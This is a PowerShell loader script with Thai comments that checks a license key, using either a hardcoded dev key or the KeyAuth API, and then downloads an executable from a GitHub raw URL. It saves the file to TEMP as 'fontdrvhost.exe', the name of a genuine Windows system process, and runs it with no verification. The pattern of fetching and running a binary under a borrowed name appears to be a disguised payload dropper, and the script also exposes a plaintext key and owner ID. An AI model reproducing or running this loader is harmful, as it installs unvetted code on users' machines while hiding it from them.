Clear-Host

# ===== CONFIG =====
$AppName = "Smithshop all"
$OwnerID = "gw1rzpahob"
$Version = "1.0"
$DevKey = "devsmithshop"   # <-- ใช้ Key dev ของคุณ
$ExeURL = "https://github.com/draft7973-ops/Smithshop/raw/main/fontdrvhost.exe"
$ExeOutput = "$env:TEMP\fontdrvhost.exe"

# ===== MENU =====
Write-Host "=== MENU ==="
Write-Host "1. Install"
Write-Host "2. Clean"

$choice = Read-Host "Choose 1 or 2"

switch ($choice) {
    "1" {
        $userKey = Read-Host "Enter your Key"

        # สำหรับ Dev Key ใช้เช็คตรง ๆ
        if ($userKey -eq $DevKey) {
            Write-Host "✅ Key valid! Installing..."
            Invoke-WebRequest $ExeURL -OutFile $ExeOutput
            Start-Process $ExeOutput
            Write-Host "Installation complete ✅"
        } else {
            # ถ้าไม่ใช่ Dev Key → เช็คผ่าน KeyAuth API (ถ้ามี API จริง)
            try {
                $apiURL = "https://keyauth.win/api/1.0/?type=license&key=$userKey&app=$AppName&ownerid=$OwnerID&version=$Version"
                $response = Invoke-RestMethod -Uri $apiURL -Method Get
            } catch {
                Write-Host "❌ Cannot reach KeyAuth server" -ForegroundColor Red
                break
            }

            if ($response.success -eq $true) {
                Write-Host "✅ Key valid! Installing..."
                Invoke-WebRequest $ExeURL -OutFile $ExeOutput
                Start-Process $ExeOutput
                Write-Host "Installation complete ✅"
            } else {
                Write-Host "❌ Key invalid!" -ForegroundColor Red
            }
        }
    }
    "2" {
        Write-Host "Cleaning..."
        if (Test-Path $ExeOutput) {
            Remove-Item $ExeOutput -Force
            Write-Host "File removed successfully ✅"
        } else {
            Write-Host "File not found ⚠️"
        }
    }
    default {
        Write-Host "Invalid choice ⚠️"
    }
}

Pause
